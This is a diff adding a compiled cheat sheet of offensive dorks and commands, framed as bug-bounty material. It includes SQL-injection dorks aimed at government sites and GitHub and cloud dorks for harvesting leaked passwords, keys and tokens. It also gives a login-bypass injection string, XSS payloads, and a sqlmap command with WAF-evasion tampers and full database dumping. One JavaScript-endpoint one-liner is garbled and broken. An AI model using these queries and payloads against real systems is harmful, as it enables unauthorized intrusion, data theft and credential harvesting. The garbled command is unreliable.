@@ -1,0 +1,581 @@
+Xss Dorks By SoulCoder
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostold/feedpost.php?url=
+inurl:scrapbook.php?id=
+inurl:headersearch.php?sid=
+inurl:/poll/default.asp?catid=
+inurl:/search_results.php?search=
+----------------------------------------------------------------------------------
+SQL injection Tip 🔥📢
+
+site:example[.]com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
+----------------------------------------------------------------------------------
+Google Dork To Open Redirect
+
+site:*.target.com inurl:%2f [%2f Is the URL encoding for /]
+----------------------------------------------------------------------------------
+I found lot bugs using this dorks in github 
+
+"Target.com" language:yml 
+"Target. com" language:yml "_key"
+"Target. com" language:yml "admin"
+"Target. com" language:yml "root"
+"Target. com" language:yml "host"
+----------------------------------------------------------------------------------
+▪️SQL Injection dorks for government websites :
+
+inurl:index.php?id= site:gov.uk
+inurl:index.php?id= site:gov
+inurl:news.php?id= site:gov.uk
+inurl:oferta.php?id= site:gov.uk
+inurl:trainers.php?id= site:gov.uk
+inurl:article.php?ID= site:gov.uk
+inurl:play_old.php?id= site:gov.uk
+inurl:declaration_more.php?decl_id= site:gov.uk
+inurl:Pageid= site:gov
+inurl:pagina.php?left= site:.gov.au
+inurl:pagina.php?file= site:.gov.fr
+inurl:layout.php?id=120' site:gov.uk
+inurl:principal.php?id=123' site:gov.uk
+inurl:standard.php?base_dir= site:gov
+inurl:home.php?where= site:gov.uk
+inurl:page.php?sivu= site:gov.uk
+inurl:*inc*.php?adresa= site:gov
+inurl:padrao.php?str= site:gov
+inurl:include.php?my= site:.gov.uk
+inurl:show.php?home= site:gov.uk
+inurl:index.php?lid=20 site:gov.uk
+inurl:principal.php?id=30 site:gov
+inurl:file.php?id=205 site:gov.uk
+inurl:info.php?id=25155 site:gov.um
+inurl:enter.php?id=203 site:gov.uk
+inurl:general.php?id=50 site:gov
+inurl:principal.php?id=705 site:gov.za
+inurl:standard.php?id=303 site:.gov.ie
+nurl:nota.php?v= site:gov.bc.ca
+inurl:home.php?str= site:ed.gov
+inurl:press.php?panel= site:gov.mu
+inurl:page.php?mod= site:gov
+inurl:default.php?param= site:gov
+inurl:down*.php?texto= site:go.af
+inurl:mod*.php?dir= site:gov.ie
+inurl:view.php?where= site:gov.za
+inurl:blank.php?subject= site:gov.br
+inurl:path.php?play= site:gov.uk
+inurl:base.php?l= site:gov.au
+----------------------------------------------------------------------------------
+dork : inurl:wp-config.php intext:DB_PASSWORD -stackoverflow -wpbeginner -foro -forum -topic -blog -about -docs -articles
+----------------------------------------------------------------------------------
+# Broad domain search w/ negative search > site:example.com -www-shop-share -ir -mfa
+# PHP extension w/ parameters > site:example.com ext: php inurl:?
+# Disclosed XSS and Open Redirects > site:openbugbounty.org inurl: reports intext: "example.com"
+# Juicy Extensions > site: "example[.]com" ext:log | ext:txt | ext:conf | ext: cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ |ext:git | ext:svn | ext:htpasswd | ext: htaccess
+# XSS prone parameters > inurl:q= | inurl:s= | inurl: search= | inurl:query= | inurl: keyword= | inurl:lang= inurl:& site:example.com
+# Open Redirect prone parameters > inurl:url= | inurl: return= | inurl: next= | inurl: redirect= | inurl:redir= |inurl:ret= | inurl: r2= | inurl:page= inurl:& inurl:http site:example.com
+----------------------------------------------------------------------------------
+Some Shodan Dorks that might useful in Bug Bounty. 
+
+1. org:"http://target. com" 
+2. http.status:"<status_code>" 
+3. product:"<Product_Name>" 
+4. port:<Port_Number> “Service_Message” 
+5. port:<Port_Number> “Service_Name” 
+6. http.component:"<Component_Name>" 
+7. http.component_category:"<Component_Category> 
+8. http.waf:"<firewall_name>" 
+9. http.html:"<Name>" 
+10. http.title:"<Title_Name>" 
+11. ssl.alpn:"<Protocol>" 
+12. http.favicon.hash:"<Favicon_Hash>" 
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
+14. http://ssl.cert.subject.cn:"<http://Domain .com>" 
+15. asn:"<ASnumber>" 
+16. hostname:"<hosthame>" 
+17. ip:"<IP_Address>" 
+18. all:"<Keyword>" 
+19. “Set-Cookie: phpMyAdmin” 
+20. “Set-Cookie: lang=" 
+21. “Set-Cookie: PHPSESSID" 
+22. “Set-Cookie: webvpn” 
+23. “Set-Cookie:webvpnlogin=1" 
+24. “Set-Cookie:webvpnLang=en” 
+25. “Set-Cookie: mongo-express=" 
+26. “Set-Cookie: user_id=" 
+27. “Set-Cookie: phpMyAdmin=" 
+28. “Set-Cookie: _gitlab_session” 
+29. “X-elastic-product: Elasticsearch” 
+30. “x-drupal-cache” 
+31. “access-control-allow-origin” 
+32. “WWW-Authenticate”  
+33. “X-Magento-Cache-Debug”   
+34. “kbn-name: kibana”
+----------------------------------------------------------------------------------
+PHP : ext:php inurl:? site:example[.]com
+🤫 Juicy Extensions : ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:example[.]com
+
+----------------------------------------------------------------------------------
+Azure OSINT Google Dork List
+
+- site:blob.core.windows.net “keyword” 
+- site:"blob.core.windows.net" and intext:"CONFIDENTIAL"
+- site:*.core.windows.net intext:"TLP:RED"
+- site:*.core.windows.net
+- site:*.core.windows.net +blob
+- site:*.core.windows.net +files -web -blob
+- site:*.core.windows.net -web
+- site:*.core.windows.net -web -blob -files
+- site:*.core.windows.net inurl:dsts.dsts
+- site:*.core.windows.net inurl:"term" -web
+- site:*.blob.core.windows.net ext:xls | ext:xlsx (login | password | username)
+- intext:connectionstring blob filetype:config
+- intext:accountkey windows.net filetype:xml
+- intext:storageaccountkey windows.net filetype:txt
+----------------------------------------------------------------------------------
+🔥 Github-Dork
+🔍 api_key
+🔍 app_AWS_SECRET_ACCESS_KEY 
+🔍 app_secret
+🔍 authoriztion
+🔍 Ldap
+🔍 aws_access_key_id
+🔍 secret
+🔍 bash_history
+🔍 bashrc%20password
+🔍 beanstalkd
+🔍 client secre
+🔍 composer
+🔍 config
+🔍 credentials
+🔍 DB_PASSWORD
+🔍 dotfiles
+🔍 .env file
+🔍 .exs file
+🔍 extension:json mongolab.com 
+🔍 extension:pem%20private
+🔍 extension:ppk private
+🔍 extension:sql mysql dump
+🔍 extension:yaml mongolab.com
+🔍 .mlab.com password
+🔍 mysql
+🔍 npmrc%20_auth
+🔍 passwd
+🔍 passkey
+🔍 rds.amazonaws.com password
+🔍 s3cfg
+🔍 send_key
+🔍 token
+🔍 filename:.bash_history
+🔍 filename:.bash_profile aws
+🔍 filename:.bashrc mailchimp
+🔍 filename:CCCam.cfg
+🔍 filename:config irc_pass
+🔍 filename:config.php dbpasswd
+🔍 filename:config.json auths
+🔍 filename:config.php pass
+🔍 filename:config.php dbpasswd
+🔍 filename:connections.xml
+🔍 filename:.cshrc
+🔍 filename:.git-credentials
+🔍 filename:.ftpconfig
+🔍 filename:.history
+🔍 filename:gitlab-recovery-codes.txt
+🔍 filename:.htpasswd
+🔍 filename:id_rsa
+🔍 filename:.netrc password
+🔍 FTP
+🔍 filename:wp-config.php
+🔍 git-credentials
+🔍 github_token
+🔍 HEROKU_API_KEY language:json
+🔍 HEROKU_API_KEY language:shell
+🔍 GITHUB_API_TOKEN language:shell
+🔍 oauth
+🔍 OTP
+🔍 databases password
+🔍 [WFClient] Password= extension:ica
+🔍 xoxa_Jenkins
+🔍 security_credentials
+----------------------------------------------------------------------------------
+"lecture notes" + "system design" + site:.edu + filetype:pdf
+----------------------------------------------------------------------------------
+Some Shodan Dorks that might useful in Bug Bounty. 
+1. org:"http://target. com" 
+2. http.status:"<status_code>" 
+3. product:"<Product_Name>" 
+4. port:<Port_Number> “Service_Message” 
+5. port:<Port_Number> “Service_Name” 
+6. http.component:"<Component_Name>" 
+7. http.component_category:"<Component_Category> 
+8. http.waf:"<firewall_name>" 
+9. http.html:"<Name>" 
+10. http.title:"<Title_Name>" 
+11. ssl.alpn:"<Protocol>" 
+12. http.favicon.hash:"<Favicon_Hash>" 
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
+14. http://ssl.cert.subject.cn:"<http://Domain .com>" 
+15. asn:"<ASnumber>" 
+16. hostname:"<hosthame>" 
+17. ip:"<IP_Address>" 
+18. all:"<Keyword>" 
+19. “Set-Cookie: phpMyAdmin” 
+20. “Set-Cookie: lang=" 
+21. “Set-Cookie: PHPSESSID" 
+22. “Set-Cookie: webvpn” 
+23. “Set-Cookie:webvpnlogin=1" 
+24. “Set-Cookie:webvpnLang=en” 
+25. “Set-Cookie: mongo-express=" 
+26. “Set-Cookie: user_id=" 
+27. “Set-Cookie: phpMyAdmin=" 
+28. “Set-Cookie: _gitlab_session” 
+29. “X-elastic-product: Elasticsearch” 
+30. “x-drupal-cache” 
+31. “access-control-allow-origin” 
+32. “WWW-Authenticate”  
+33. “X-Magento-Cache-Debug”   
+34. “kbn-name: kibana”
+----------------------------------------------------------------------------------
+site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+----------------------------------------------------------------------------------
+Reflected XSS In some easy steps
+
+1- Simple Google Dork *.target[.]com ext:php
+2- get some interesting Subdomain
+3- I use waybackurls to collect endpoint like echo "sub[.]target[.]com" | waybackurls | httpx | sort -u > endpoint.txt
+4- cat endpoint.txt | grep "=" | kxss
+----------------------------------------------------------------------------------
+Basic Sql
+
+Dork:- intitle: "index" of "admin" site.in
+Dork:- inurl/admin/index.php
+
+Username= 1 'or' 1 '=' 1
+Password= 1 'or' 1 '=' 1
+----------------------------------------------------------------------------------
+Find Subdomain By Dorking :  site:*.google.com
+----------------------------------------------------------------------------------
+Github Dorks::
+"https://www.google.com" password
+"https://www.google.com" key
+"https://www.google.com" secret
+"https://www.google.com" pass
+"https://www.google.com" credentials
+"https://www.google.com" login
+"https://www.google.com" token
+"https://www.google.com" ftp
+"https://www.google.com" config
+"https://www.google.com" pwd
+"https://www.google.com" security_credentials
+"https://www.google.com" connectionstring
+"https://www.google.com" JDBC
+"https://www.google.com" ssh2_auth_password
+"https://www.google.com" send_keys or send,keys
+"https://www.google.com" vsphere
+
+More Dorks :: https://gist.githubusercontent.com/EdOverflow/8bd2faad513626c413b8fc6e9d955669/raw/06a0ef0fd83920d513c65767aae258ecf8382bdf/gistfile1.txt
+----------------------------------------------------------------------------------
+# Broad domain search w/ negative search > site:example.com -www-shop-share -ir -mfa
+# PHP extension w/ parameters > site:example.com ext: php inurl:?
+# Disclosed XSS and Open Redirects > site:openbugbounty.org inurl: reports intext: "example.com"
+# Juicy Extensions > site: "example[.]com" ext:log | ext:txt | ext:conf | ext: cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext: htaccess
+# XSS prone parameters > inurl:q= | inurl:s= | inurl: search= | inurl:query= | inurl: keyword= |inurl:lang= inurl:& site:example.com
+# Open Redirect prone parameters > inurl:url= | inurl: return= | inurl: next= | inurl: redirect= | inurl:redir= | inurl:ret= | inurl: r2= | inurl:page= inurl:& inurl:http site:example.com
+----------------------------------------------------------------------------------
+Some Important Google Dorks::
+cache:example.com 
+site:example.com 
+filetype:pdf 
+filetype:pdf & (before:2022-01-01 after:2023-01-01) 
+related:www.google.com 
+intext:"Google Dork Query" 
+inanchor:"cyber attacks" 
+example1 | example2 - dork 
+example1 | example2 
+intitle:"Index of /" 
+intitle:"Apache2 Debian Default Page" 
+intitle:"Index of /" or intitle:"Browse Directory" 
+intitle:"config.json" 
+intitle:"index of" inurl:.git 
+intitle:"remote desktop inurl:rdweb" 
+intitle:"Index of /ftp" 
+----------------------------------------------------------------------------------
+I found lot bugs using this dorks in github 
+
+"Target.com" language:yml 
+"Target. com" language:yml "_key"
+"Target. com" language:yml "admin"
+"Target. com" language:yml "root"
+"Target. com" language:yml "host"
+----------------------------------------------------------------------------------
+Shodan Dork :: https://mr-koanti.github.io/shodan
+Github Dork :: https://mr-koanti.github.io/github.html
+Bug Bounty Helper :: https://dorks.faisalahmed.me/#
+Lopseg Osint :: https://www.lopseg.com.br/osint
+BLind XSS : https://husseinphp.github.io/
+----------------------------------------------------------------------------------
+Focus on training about bug hunting (not bounty for the first)
+1. Google Dork: inurl:"/product.php?id="
+2. Choose one (eg: customweb[.]net/product[.]id=18)
+3. After navigated to new tab, insert quote after 18
+4. Appears error of coding (SQL injection ErrorBased)
+5. Navigate back to point 2
+6. Insert (my own) payload into searchbox
+[+] HTML INJECTION to OPEN REDIRECT : <a%20onmouseover=alert%20href=google.com>Hacked by dax1986
+[+] HTML INJECTION : <img src=https://lnkd.in/gBZjpH7q onMouseOver=alert(1)>
+----------------------------------------------------------------------------------
+Azure OSINT Google Dork List
+
+- site:blob.core.windows.net “keyword” 
+- site:"blob.core.windows.net" and intext:"CONFIDENTIAL"
+- site:*.core.windows.net intext:"TLP:RED"
+- site:*.core.windows.net
+- site:*.core.windows.net +blob
+- site:*.core.windows.net +files -web -blob
+- site:*.core.windows.net -web
+- site:*.core.windows.net -web -blob -files
+- site:*.core.windows.net inurl:dsts.dsts
+- site:*.core.windows.net inurl:"term" -web
+- site:*.blob.core.windows.net ext:xls | ext:xlsx (login | password | username)
+- intext:connectionstring blob filetype:config
+- intext:accountkey windows.net filetype:xml
+- intext:storageaccountkey windows.net filetype:txt
+Please Share Across Your Network, Someone Might Really Be Looking For This. 
+----------------------------------------------------------------------------------
+Google Dork - API Endpoints 🔗 site:example.jcom inurl:api | site:*/rest | site:*/ v1 | site:*/v2 | site:*/v3
+----------------------------------------------------------------------------------
+inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:example[.]com 
+----------------------------------------------------------------------------------
+inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example[.]com 
+----------------------------------------------------------------------------------
+intitle:"index of /" site:nasa.gov
+intitle:"index of /" "database" site:nasa.gov
+intitle:"index of /" "admin" site:nasa.gov
+intitle:"index of /" "contact" site:nasa.gov
+----------------------------------------------------------------------------------
+site:targetsite.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv 
+----------------------------------------------------------------------------------
+(shopify.com) (site:*.*.255.* | site:*.*.254.* | site:*.*.253.* | site:*.*.252.* | site:*.*.251.* | site:*.*.250.* | site:*.*.249.* | site:*.*.248.* | site:*.*.247.* | site:*.*.246.* | site:*.*.245.* | site:*.*.244.* | site:*.*.243.* | site:*.*.242.* | site:*.*.241.* | site:*.*.240.*)
+----------------------------------------------------------------------------------
+site:thehackernews.com "unauthenticated"
+site:thehackernews.com "vulnerability"
+site:thehackernews.com "CVE-2024" 
+site:thehackernews.com "critical vulnerability"
+----------------------------------------------------------------------------------
+(target.com) (site:*.*.29.* |site:*.*.28.* |site:*.*.27.* |site:*.*.26.* |site:*.*.25.* |site:*.*.24.* |site:*.*.23.* |site:*.*.22.* |site:*.*.21.* |site:*.*.20.* |site:*.*.19.* |site:*.*.18.* |site:*.*.17.* |site:*.*.16.* |site:*.*.15.* |site:*.*.14.* |site:*.*.13.* |site:*.*.12.* |site:*.*.11.* |site:*.*.10.* |site:*.*.9.* |site:*.*.8.* |site:*.*.7.* |site:*.*.6.* |site:*.*.5.* |site:*.*.4.* |site:*.*.3.* |site:*.*.2.* |site:*.*.1.* |site:*.*.0.*)
+----------------------------------------------------------------------------------
+site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+
+site:*dell.com (ext:env OR ext:json OR ext:xml OR ext:sql OR ext:bak OR ext:log OR ext:key OR ext:crt OR ext:pem)
+----------------------------------------------------------------------------------
+⛔️XSS :inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example[.]com
+⛔️Open Redirect > inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com
+⛔️SQLi Prone Parameters > inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example[.]com
+⛔️SSRF Prone Parameters > inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example[.]com
+⛔️LFI  > inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example[.]com
+⛔️RCE  > inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example[.]com
+----------------------------------------------------------------------------------
+site:*.domain.com "join.slack" ext:pdf "invite"
+site:*.domain.com "join.slack" ext:pdf "invite" "internal"
+site:*.domain.com "join.slack" ext:pdf "invite" "confidential"
+site:*.domain.com "join.slack" ext:pdf "invite" "highly confidential"
+
+https://www.youtube.com/watch?v=kYECxMZ0Dgs
+----------------------------------------------------------------------------------
+RCE (Remote Code Execution) 
+Severity Level: Critical
+cvss_score": 9.8
+
+Shodan Dork : app="SPIP"
+
+Poc Video Link : https://lnkd.in/dcTeAqpD
+----------------------------------------------------------------------------------
+Google Dorks - Code Leaks💧
+site:pastebin.com "example.com"
+site:jsfiddle.net "example.com"
+site:codebeautify.org "example.com"
+site:codepen.io "example.com"
+----------------------------------------------------------------------------------
+XSS Finder:
+
+https://github.com/faiyazahmad07/xss_vibes
+https://github.com/s0md3v/XSStrike
+
+python3 main.py -u www.abc.xyz/product-list.php?search=
+python3 xsstrike.py -u www.abc.xyz/product-list.php?search=
+----------------------------------------------------------------------------------
+Google Dorks for Bug Bounty
+
+PHP extension w/ parameters
+site:http://example.com ext:php inurl:?
+
+API Endpoints
+site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
+
+Juicy Extensions
+site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json
+
+High % inurl keywords
+inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example[.]com
+
+Server Errors
+inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:example[.]com
+
+XSS prone parameters
+inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:http://example.com
+
+Open Redirect prone parameters
+inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:http://example.com
+
+SQLi Prone Parameters
+inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:http://example.com
+
+SSRF Prone Parameters
+inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:http://example.com
+
+LFI Prone Parameters
+inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:http://example.com
+
+RCE Prone Parameters
+inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:http://example.com
+
+File upload endpoints
+site:http://example.com ”choose file”
+
+API Docs
+inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"http://example.com"
+
+Login Pages
+inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example[.]com
+
+Test Environments
+inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:http://example.com
+
+Sensitive Documents
+site:http://example.com ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx intext:“confidential” | intext:“Not for Public Release” | intext:”internal use only” | intext:“do not distribute”
+
+Sensitive Parameters
+inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:http://example.com
+
+Adobe Experience Manager (AEM)
+inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:http://example.com
+----------------------------------------------------------------------------------
+Tools for searching emails for a specific domain:
+snov.io/email-finder
+experte.com/email-finder
+https://github.com/Josue87/EmailFinder
+github.com/GiJ03/Infoga
+infoga.io 
+findemail.io
+hunter.io/domain-search
+https://lnkd.in/dnxusa4M
+minelead.io
+----------------------------------------------------------------------------------
+katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl
+----------------------------------------------------------------------------------
+sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+----------------------------------------------------------------------------------
+Easy to find Sql Injection:
+echo "http://<target>/" | gau | uro | grep "\?" | sed "s/=.*/=A\'/" | uniq > params.txt; cat params.txt | httpx -mr ".*SQL.*|.*syntax.*|.*error.*"
+sqlmap -u "http://<target>/sqli?param=A" -p param --dbms=MSSQL --level 1 --risk 1 --banner
+----------------------------------------------------------------------------------
+https://osint.rocks/
+----------------------------------------------------------------------------------
+Extract all endpoints from a JS File and take your bug 🐞
+
+✅Method one
+waybackurls HOSTS | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?
+15*[=: 1\5*[ '\"]?[^'\"]+.js[^'|"> ]*" | awk -F '/'
+'{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh
+-c "curl -k -s \"%)" | sed \"s/[;}\)>]/\n/g\" | grep -Po \" (L'1|\"](https?: )?[/1{1,2}[^'||l"> 1{5,3)|(\.
+(get|post|ajax|load)\s*\(\5*['||\"](https?:)?[/1{1,2}[^'||\"> ]
+{5,})\"" | awk -F "['|"]" '{print $2}' sort -fu
+
+waybackurls example.com | tac | sed 's#\\\/#\/#g' | egrep -o "src['\"]?[^'\"]+.js[^'|\"> ]*" | awk -F '/' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\"" | sed 's/[;}\)>]/\n/g' | grep -Po "(get|post|ajax|load)\s*\(['\"](https?:)?//[^'\"]+" | awk -F "['\"]" '{print $2}' | sort -fu
+
+✅Method two
+cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt
+----------------------------------------------------------------------------------
+Updated CVE:
+
+-> curl cvedb.shodan.io/cves | jq | grep "cve_id"
+-> curl -s cvedb.shodan.io/cves | jq '[.cves | {cveid: .cve_id, summary: .summary}]'
+----------------------------------------------------------------------------------
+How I Personally Look For Information Disclosure Bugs 
+
+cat urls.txt | grep -E "\.txt/\.log/\.cache/\.secret|\.db/\.backup/\.yml/\.json/\.gz|\.rar|\.zip/|\.tar/\.sql/\.env/\.config/\.conf/\.ini/\.htaccess/\.htpasswd/\.pem/\.key/\.crt/\.cer/\.pfx/\.p12/\.swp/\.bak/\.old/\.tmp/\.temp/\.dump/\.passwd/\.shadow/\.git/\.svn/\.DS_Store/\.idea/\.vscode/\.bash_history/\.zsh_history
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+
+
+Link 🔗:- https://github.com/netlas-io/netlas-dorks
+
+Google Dork :
+https://github.com/TakSec/google-dorks-bug-bounty/
+https://taksec.github.io/google-dorks-bug-bounty/
+https://github.com/sushiwushi/bug-bounty-dorks
+https://github.com/cipher387/Dorks-collections-list/
+https://github.com/Lucksi/Mr.Holmes
+
+Oneliner : https://github.com/HackShiv/OneDorkForAll/tree/main
+
+Online tools for automating work with dorks (Google and beyond):
+🔅dorki.io
+🔅https://lnkd.in/ghpygKqw
+🔅dorksearch.com
+🔅dorkme.com
+🔅dorkgenius.com
+🔅dorks.faisalahmed.me
+
+Google, Bing, Ecosia, Yahoo or Yandex*
+https://github.com/Zarcolio/sitedorks
+
+Google dorks
+https://github.com/BullsEye0/google_dork_list
+https://github.com/sushiwushi/bug-bounty-dorks
+https://github.com/rootac355/SQL-injection-dorks-list
+https://github.com/unexpectedBy/SQLi-Dork-Repository
+https://github.com/thomasdesr/Google-dorks
+https://github.com/arimogi/Google-Dorks
+https://github.com/aleedhillon/7000-Google-Dork-List
+
+DuckDuckGo dorks
+https://github.com/d34dfr4m3/goDuck
+
+Github dorks
+https://github.com/techgaun/github-dorks
+https://github.com/jcesarstef/ghhdb-Github-Hacking-Database
+https://github.com/H4CK3RT3CH/github-dorks
+
+Shodan dorks
+https://github.com/humblelad/Shodan-Dorks
+https://github.com/AustrianEnergyCERT/ICS_IoT_Shodan_Dorks
+https://github.com/lothos612/shodan
+https://github.com/jakejarvis/awesome-shodan-queries
+https://github.com/IFLinfosec/shodan-dorks
+
+Virus Total dorks
+https://github.com/Neo23x0/vti-dorks
+
+Binary Edge + Shodan + Google
+https://github.com/iGotRootSRC/Dorkers
